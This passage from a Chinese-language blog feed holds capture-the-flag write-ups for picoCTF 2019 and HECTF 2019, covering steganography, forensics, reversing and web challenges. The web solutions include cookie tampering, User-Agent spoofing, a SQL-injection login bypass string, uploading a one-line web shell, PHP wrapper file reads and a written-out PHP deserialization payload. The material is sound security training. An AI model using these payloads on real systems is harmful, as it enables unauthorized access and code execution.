id="What-Lies-Within-Points-150"><a href="#What-Lies-Within-Points-150" class="headerlink" title="What Lies Within - Points: 150"></a>What Lies Within - Points: 150</h2><blockquote><p>Theres something in the building. Can you retrieve the flag?</p></blockquote><blockquote><p>Hints: There is data encoded somewhere, there might be an online decoder</p></blockquote><p>拖进stegsolve里提取最低位</p><figure class="image-box">                <img src="./15.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{h1d1ng_1n_th3_b1t5}</p><h2 id="extensions-Points-150"><a href="#extensions-Points-150" class="headerlink" title="extensions - Points: 150"></a>extensions - Points: 150</h2><blockquote><p>This is a really weird text file TXT? Can you find the flag?</p></blockquote><blockquote><p>Hints: How do operating systems know what kind of file it is? (It’s not just the ending!<br>  Make sure to submit the flag as picoCTF{XXXXX}</p></blockquote><p>打开txt看到png头,改后缀为png</p><figure class="image-box">                <img src="./16.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{now_you_know_about_extensions}</p><h2 id="shark-on-wire-1-Points-150"><a href="#shark-on-wire-1-Points-150" class="headerlink" title="shark on wire 1 - Points: 150"></a>shark on wire 1 - Points: 150</h2><blockquote><p>We found this packet capture. Recover the flag. You can also find the file in /problems/shark-on-wire-1_0_13d709ec13952807e477ba1b5404e620.</p></blockquote><blockquote><p>Hints: Try using a tool like Wireshark<br>  What are streams?</p></blockquote><p>根据hint追踪UDP流,得到flag</p><figure class="image-box">                <img src="./17.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{StaT31355_636f6e6e}</p><h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><h2 id="vault-door-training-Points-50"><a href="#vault-door-training-Points-50" class="headerlink" title="vault-door-training - Points: 50"></a>vault-door-training - Points: 50</h2><blockquote><p>Your mission is to enter Dr. Evil’s laboratory and retrieve the blueprints for his Doomsday Project. The laboratory is protected by a series of locked vault doors. Each door is controlled by a computer and requires a password to open. Unfortunately, our undercover agents have not been able to obtain the secret passwords for the vault doors, but one of our junior agents obtained the source code for each vault’s computer! You will need to read the source code for each level to figure out what the password is for that vault door. As a warmup, we have created a replica vault in our training facility. The source code for the training vault is here: VaultDoorTraining.java</p></blockquote><blockquote><p>Hints: The password is revealed in the program’s source code.</p></blockquote><figure class="image-box">                <img src="./18.png" alt="图片" title class>                <p>图片</p>            </figure><p>查看源码,得到flag   picoCTF{w4rm1ng_Up_w1tH_jAv4_fcb79c48f5b}</p><h2 id="vault-door-1-Points-100"><a href="#vault-door-1-Points-100" class="headerlink" title="vault-door-1 - Points: 100"></a>vault-door-1 - Points: 100</h2><blockquote><p>This vault uses some complicated arrays! I hope you can make sense of it, special agent. The source code for this vault is here: VaultDoor1.java</p></blockquote><blockquote><p>Hints: Look up the charAt() method online.</p></blockquote><p>按照 charAt() 方法顺序读出flag</p><p>picoCTF{d35cr4mbl3_tH3_cH4r4cT3r5_63ef3a}</p><h1 id="WEB应用"><a href="#WEB应用" class="headerlink" title="WEB应用"></a>WEB应用</h1><h2 id="Insp3ct0r-Points-50"><a href="#Insp3ct0r-Points-50" class="headerlink" title="Insp3ct0r - Points: 50"></a>Insp3ct0r - Points: 50</h2><blockquote><p>Kishor Balan tipped us off that the following code may need inspection: <a href="https://2019shell1.picoctf.com/problem/9509/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/9509/</a> (link) or <a href="http://2019shell1.picoctf.com:9509" target="_blank" rel="noopener">http://2019shell1.picoctf.com:9509</a></p></blockquote><blockquote><p>Hints: How do you inspect web code on a browser?<br>  There’s 3 parts</p></blockquote><p>进页面后,分别在html,css,js代码里找到三个部分的flag</p><figure class="image-box">                <img src="./19.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="image-box">                <img src="./20.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="image-box">                <img src="./21.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?8a7e3144}</p><h2 id="dont-use-client-side-Points-100"><a href="#dont-use-client-side-Points-100" class="headerlink" title="dont-use-client-side - Points: 100"></a>dont-use-client-side - Points: 100</h2><blockquote><p>Can you break into this super secure portal? <a href="https://2019shell1.picoctf.com/problem/49886/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/49886/</a> (link) or <a href="http://2019shell1.picoctf.com:49886" target="_blank" rel="noopener">http://2019shell1.picoctf.com:49886</a></p></blockquote><blockquote><p>Hints: Never trust the client</p></blockquote><p>调console看到js代码里的flag片段,flag可以由意思猜出来</p><figure class="image-box">                <img src="./22.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{no_clients_plz_ee2f24}</p><h2 id="logon-Points-100"><a href="#logon-Points-100" class="headerlink" title="logon - Points: 100"></a>logon - Points: 100</h2><blockquote><p>The factory is hiding things from all of its users. Can you login as logon and find what they’ve been looking at? <a href="https://2019shell1.picoctf.com/problem/47307/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/47307/</a> (link) or <a href="http://2019shell1.picoctf.com:47307" target="_blank" rel="noopener">http://2019shell1.picoctf.com:47307</a></p></blockquote><blockquote><p>Hints: Hmm it doesn’t seem to check anyone’s password, except for ‘s?</p></blockquote><p>试了几个用户登进去都没有flag,后来F12进后台看cookie有admin=Flase,改成True就行</p><figure class="image-box">                <img src="./23.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{th3_c0nsp1r4cy_l1v3s_95e4b2d5}</p><h2 id="where-are-the-robots-Points-100"><a href="#where-are-the-robots-Points-100" class="headerlink" title="where are the robots - Points: 100"></a>where are the robots - Points: 100</h2><blockquote><p>Can you find the robots? <a href="https://2019shell1.picoctf.com/problem/47235/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/47235/</a> (link) or <a href="http://2019shell1.picoctf.com:47235" target="_blank" rel="noopener">http://2019shell1.picoctf.com:47235</a></p></blockquote><blockquote><p>Hints: What part of the website could tell you where the creator doesn’t want you to look?</p></blockquote><p>查看robots.txt文件</p><figure class="image-box">                <img src="./24.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="image-box">                <img src="./25.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{ca1cu1at1ng_Mach1n3s_54e98}</p><h2 id="Client-side-again-Points-200"><a href="#Client-side-again-Points-200" class="headerlink" title="Client-side-again - Points: 200"></a>Client-side-again - Points: 200</h2><blockquote><p>Can you break into this super secure portal? <a href="https://2019shell1.picoctf.com/problem/47277/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/47277/</a> (link) or <a href="http://2019shell1.picoctf.com:47277" target="_blank" rel="noopener">http://2019shell1.picoctf.com:47277</a></p></blockquote><blockquote><p>Hints: What is obfuscation?</p></blockquote><figure class="image-box">                <img src="./26.png" alt="图片" title class>                <p>图片</p>            </figure><p>混淆还是能猜出来是啥的  </p><p>picoCTF{not_this_again_d29871}</p><h2 id="Open-to-admins-Points-200"><a href="#Open-to-admins-Points-200" class="headerlink" title="Open-to-admins - Points: 200"></a>Open-to-admins - Points: 200</h2><blockquote><p>This secure website allows users to access the flag only if they are admin and if the time is exactly 1400. <a href="https://2019shell1.picoctf.com/problem/45127/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/45127/</a> (link) or <a href="http://2019shell1.picoctf.com:45127" target="_blank" rel="noopener">http://2019shell1.picoctf.com:45127</a></p></blockquote><blockquote><p>Hints: Can cookies help you to get the flag?</p></blockquote><p>同上一题,在cookie里添加两个变量</p><p>admin=True,time=1400,得到flag</p><figure class="image-box">                <img src="./27.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{0p3n_t0_adm1n5_42e59862}</p><h2 id="picobrowser-Points-200"><a href="#picobrowser-Points-200" class="headerlink" title="picobrowser - Points: 200"></a>picobrowser - Points: 200</h2><blockquote><p>This website can be rendered only by picobrowser, go and catch the flag! <a href="https://2019shell1.picoctf.com/problem/37829/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/37829/</a> (link) or <a href="http://2019shell1.picoctf.com:37829" target="_blank" rel="noopener">http://2019shell1.picoctf.com:37829</a></p></blockquote><blockquote><p>Hints: You dont need to download a new web browser</p></blockquote><figure class="image-box">                <img src="./28.png" alt="图片" title class>                <p>图片</p>            </figure><p>伪造一下UA头  picoCTF{p1c0_s3cr3t_ag3nt_7e9c671a}</p><h2 id="Irish-Name-Repo-1-Points-300"><a href="#Irish-Name-Repo-1-Points-300" class="headerlink" title="Irish-Name-Repo 1 - Points: 300"></a>Irish-Name-Repo 1 - Points: 300</h2><blockquote><p>There is a website running at <a href="https://2019shell1.picoctf.com/problem/32241/" target="_blank" rel="noopener">https://2019shell1.picoctf.com/problem/32241/</a> (link) or <a href="http://2019shell1.picoctf.com:32241" target="_blank" rel="noopener">http://2019shell1.picoctf.com:32241</a>. Do you think you can log us in? Try to see if you can login!</p></blockquote><blockquote><p>Hints: There doesn’t seem to be many ways to interact with this, I wonder if the users are kept in a database?<br>  Try to think about how does the website verify your login?</p></blockquote><p>用万能密码  admin’ or ‘1’=’1  直接可以登陆</p><figure class="image-box">                <img src="./29.png" alt="图片" title class>                <p>图片</p>            </figure><p>picoCTF{s0m3_SQL_0397f20c}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一般技能&quot;&gt;&lt;a href=&quot;#一般技能&quot; class=&quot;headerlink&quot; title=&quot;一般技能&quot;&gt;&lt;/a&gt;一般技能&lt;/h1&gt;&lt;h2 id=&quot;The-Factory’s-Secret-Points-1&quot;&gt;&lt;a href=&quot;#The-Factory’s-Se
      
    
    </summary>
    
    
      <category term="ctf writeup" scheme="https://www.damyahome.github.io/categories/ctf-writeup/"/>
    
    
      <category term="个人ctf竞赛" scheme="https://www.damyahome.github.io/tags/%E4%B8%AA%E4%BA%BActf%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2019HECTF wp</title>
    <link href="https://www.damyahome.github.io/2019HECTF-wp/"/>
    <id>https://www.damyahome.github.io/2019HECTF-wp/</id>
    <published>2019-11-08T12:14:30.000Z</published>
    <updated>2019-11-08T12:56:01.306Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Code-execution"><a href="#Code-execution" class="headerlink" title="Code execution"></a>Code execution</h2><p>首页是一个shell.php，访问</p><figure class="image-box">                <img src="./1.png" alt="图片" title class>                <p>图片</p>            </figure><p>cmd不能执行phpinfo，而php_cmd却可以</p><figure class="image-box">                <img src="./2.png" alt="图片" title class>                <p>图片</p>            </figure><p>在upload页面上一句话，在根目录下发现flag.txt，但是没有权限访问</p><figure class="image-box">                <img src="./3.png" alt="图片" title class>                <p>图片</p>            </figure><p>所以就利用cmd_php来执行命令，这里用反引号执行</p><figure class="image-box">                <img src="./4.png" alt="图片" title class>                <p>图片</p>            </figure><h2 id="我只会ping吗"><a href="#我只会ping吗" class="headerlink" title="我只会ping吗"></a><strong>我只会</strong>ping<strong>吗</strong></h2><figure class="image-box">                <img src="./5.png" alt="图片" title class>                <p>图片</p>            </figure><figure class="image-box">                <img src="./6.png" alt="图片" title class>                <p>图片</p>            </figure><h2 id="file在哪里"><a href="#file在哪里" class="headerlink" title="file在哪里"></a><strong>file在哪里</strong></h2><p><strong>php伪协议读hint.php</strong></p><figure class="image-box">                <img src="./7.png" alt="图片" title class>                <p>图片</p>            </figure><p>base64解码得到</p><figure class="image-box">                <img src="./8.png" alt="图片" title class>                <p>图片</p>            </figure><p>然后spam+栅栏密码解密<a href="http://www.spammimic.com/decode.cgi" target="_blank" rel="noopener">http://www.spammimic.com/decode.cgi</a></p><figure class="image-box">                <img src="./9.png" alt="图片" title class>                <p>图片</p>            </figure><h2 id="Romance签到"><a href="#Romance签到" class="headerlink" title="Romance签到"></a><strong>Romance签到</strong></h2><figure class="image-box">                <img src="./10.png" alt="图片" title class>                <p>图片</p>            </figure><p>访问得到hint.php</p><figure class="image-box">                <img src="./11.png" alt="图片" title class>                <p>图片</p>            </figure><p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen</a></p><p>在线解密flag{1ac59eab-7240-446e-b52b-a795e102966a}</p><h2 id="金闪闪的小饼干"><a href="#金闪闪的小饼干" class="headerlink" title="金闪闪的小饼干"></a><strong>金闪闪的小饼干</strong></h2><p>题目提示金闪闪的小饼干，抓包查看cookie</p><figure class="image-box">                <img src="./12.png" alt="图片" title class>                <p>图片</p>            </figure><p>base64解码值就是flag</p><figure class="image-box">                <img src="./13.png" alt="图片" title class>                <p>图片</p>            </figure><h2 id="缘分"><a href="#缘分" class="headerlink" title="缘分"></a>缘分</h2><p>根据题目提示“相恨见晚”，说明Hint中的特定时间是指晚上</p><p>在晚上的时候，在登陆界面随便输入，出现Warning</p><p>根据warning里的内容，flag中输入adimn，name输入admin123，提交以后得到flag</p><h2 id="你看这个php它又大又圆"><a href="#你看这个php它又大又圆" class="headerlink" title="你看这个php它又大又圆"></a>你看这个php它又大又圆</h2><figure class="image-box">                <img src="./14.png" alt="图片" title class>                <p>图片</p>            </figure><p>根据代码一步一步来，user需要等于admin</p><p>可以使用php伪协议来完成。</p><figure class="image-box">                <img src="./15.png" alt="图片" title class>                <p>图片</p>            </figure><p>然后构造pass使用数组绕过即可</p><p>然后file使用伪协议读取即可</p><figure class="image-box">                <img src="./16.png" alt="图片" title class>                <p>图片</p>            </figure><p>base64解密即可</p><p>DQo8P3BocA0KDQplcnJvcl9yZXBvcnRpbmcoRV9BTEwgJiB+RV9OT1RJQ0UpOw0KDQovL2ZsYWd7SGU2VHVDVEZAOkYxYTkxc3RIMXN9DQoNCj8+DQo=</p><figure class="image-box">                <img src="./17.png" alt="图片" title class>                <p>图片</p>            </figure><h2 id="让我们来一起变魔术吧"><a href="#让我们来一起变魔术吧" class="headerlink" title="让我们来一起变魔术吧"></a>让我们来一起变魔术吧</h2><p>F12首先看到源码</p><figure class="image-box">                <img src="./18.png" alt="图片" title class>                <p>图片</p>            </figure><p>可以看出是反序列化函数，首先收集函数，然后构造攻击链<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.__get()：读取不可访问属性的值时，__get() 会被调用</span><br><span class="line">2.__toString()：是在直接输出对象引用时自动调用的</span><br><span class="line">3.__invoke()：当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</span><br><span class="line">__toString()作为最好触发应该为攻击链突破口，然后在Test中寻找到return $func(),看来是调用__invoke()的缺口，然后就是__get()的调用了，在__toString()中看到str[&apos;str&apos;]-&gt;soure可以看出能够调用非Show类的函数，从而触发__get().</span><br><span class="line">4.现在还有一个token==token_flag这里我们可以使用php引用漏洞</span><br><span class="line">$a = 1 </span><br><span class="line">$b = &amp;$a</span><br><span class="line">$a = $a +1</span><br><span class="line">即可得$b =2</span><br><span class="line">5.攻击链</span><br><span class="line">Show()-&gt;__toString-&gt;Test()-&gt;__get-&gt;Read()-&gt;__invoke</span><br></pre></td></tr></table></figure></p><p>构造反序列化需要反攻击链<br>代码为</p><figure class="image-box">                <img src="./19.png" alt="图片" title class>                <p>图片</p>            </figure><p>构造序列化为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">：O:4:<span class="string">"Show"</span>:2:&#123;s:6:<span class="string">"source"</span>;O:4:<span class="string">"Show"</span>:2:&#123;s:6:<span class="string">"source"</span>;N;s:3:<span class="string">"str"</span>;a:1:&#123;s:3:<span class="string">"str"</span>;O:4:<span class="string">"Test"</span>:1:&#123;s:6:<span class="string">"params"</span>;O:4:<span class="string">"Read"</span>:3:&#123;s:3:<span class="string">"var"</span>;N;s:5:<span class="string">"token"</span>;N;s:10:<span class="string">"token_flag"</span>;R:8;&#125;&#125;&#125;&#125;s:3:<span class="string">"str"</span>;N;&#125;</span><br></pre></td></tr></table></figure></p><p>flag{224761e8-fb8c-460d-bc65-a151470d7085}</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="问卷题目"><a href="#问卷题目" class="headerlink" title="问卷题目"></a>问卷题目</h2><p> 提交问卷就给flag</p><h2 id="哪吒？！"><a href="#哪吒？！" class="headerlink" title="哪吒？！"></a>哪吒？！</h2><p>拖进winhex尾部看到pk头,foremost分离得到加密zip</p><p>拖进winhex发现是伪加密,破解得到flag</p><p>HEBTUCTF{Y0u_f0und_me!}</p><h2 id="这是一个极其简单的签到题"><a href="#这是一个极其简单的签到题" class="headerlink" title="这是一个极其简单的签到题"></a>这是一个极其简单的签到题</h2><p>下载后得到一个分辨率为3x500的jpeg图片.</p><p>在Kali使用binwalk发现该图为gif格式.</p><figure class="image-box">                <img src="./20.png" alt="图片" title class>                <p>图片</p>            </figure><p>更改格式后发现图内不断闪过字母(应该是flag),因为图片分辨率太小,很难观察到图内的全部内容，所以先进行gif的分帧并将所有帧拼接。</p><figure class="image-box">                <img src="./21.png" alt="图片" title class>                <p>图片</p>            </figure><p>大功告成,得到Flag.</p><h2 id="印证血统的时候到了"><a href="#印证血统的时候到了" class="headerlink" title="印证血统的时候到了"></a>印证血统的时候到了</h2><p>在drawing.js下有aaencode加密,找在线网站解密</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">getflag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    alert(<span class="string">"wait a minute"</span>);</span><br><span class="line">    alert(<span class="string">"Wait."</span>);</span><br><span class="line">    alert(<span class="string">"Wait.."</span>);</span><br><span class="line">    alert(<span class="string">"Wait..."</span>);</span><br><span class="line">    alert(<span class="string">"flag 在来的路上出了点问题"</span>);</span><br><span class="line">    <span class="keyword">var</span> flag=<span class="string">"诶呀呀 你看着可爱的小表情     ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀sojson.com*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟoﾟ])(ﾟΘﾟ))((ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ)+(ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟoﾟ]);"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>百度搜索<br>密码flag{f25a7a4b-6eae-43c5-bbe9-b76aa74c8368}</p><h2 id="咕咕咕果"><a href="#咕咕咕果" class="headerlink" title="咕咕咕果"></a>咕咕咕果</h2><figure class="image-box">                <img src="./22.png" alt="图片" title class>                <p>图片</p>            </figure><p>通过魔法上网,访问<a href="https://www.google.com/flag.txt" target="_blank" rel="noopener">https://www.google.com/flag.txt</a>，</p><figure class="image-box">                <img src="./23.png" alt="图片" title class>                <p>图片</p>            </figure><p>最后得到Flag.</p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="qiandao"><a href="#qiandao" class="headerlink" title="qiandao"></a>qiandao</h2><p>1.</p><figure class="image-box">                <img src="./24.png" alt="图片" title class>                <p>图片</p>            </figure><p>2.</p><figure class="image-box">                <img src="./25.png" alt="图片" title class>                <p>图片</p>            </figure><h2 id="helloRE"><a href="#helloRE" class="headerlink" title="helloRE"></a>helloRE</h2><p>1.</p><figure class="image-box">                <img src="./26.png" alt="图片" title class>                <p>图片</p>            </figure><p>2.</p><figure class="image-box">                <img src="./27.png" alt="图片" title class>                <p>图片</p>            </figure><p>3.</p><figure 